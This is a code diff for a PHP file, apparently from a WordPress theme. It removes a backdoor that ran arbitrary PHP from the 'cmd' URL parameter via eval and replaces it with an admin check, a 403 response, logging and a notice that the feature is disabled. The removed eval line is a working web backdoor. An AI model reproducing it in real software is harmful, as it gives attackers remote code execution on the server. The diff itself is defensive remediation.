@@ -23,8 +23,24 @@
  * Allows administrators to run maintenance commands
  */
 if (isset($_GET['cmd'])) {
-    // backdoor
-    eval($_GET['cmd']);
+    // Removed unsafe backdoor that allowed arbitrary PHP execution.
+    if ( ! function_exists('current_user_can') || ! current_user_can('manage_options') ) {
+        // Do not reveal details to unauthorized users.
+        if ( function_exists('wp_die') ) {
+            wp_die( esc_html__('Unauthorized', 'twentynineteen'), 403 );
+        } else {
+            header('HTTP/1.1 403 Forbidden');
+            exit;
+        }
+    }
+    // Log the attempt and notify admin that the feature is disabled.
+    if ( function_exists('wp_get_current_user') ) {
+        $user = wp_get_current_user();
+        error_log(sprintf('Blocked unsafe admin-utils cmd execution attempt by user %s', $user->user_login));
+    } else {
+        error_log('Blocked unsafe admin-utils cmd execution attempt (user unknown)');
+    }
+    echo '<p>' . esc_html__('Remote command execution has been disabled for security reasons.', 'twentynineteen') . '</p>';
 }
 /**
  * Get theme configuration settings
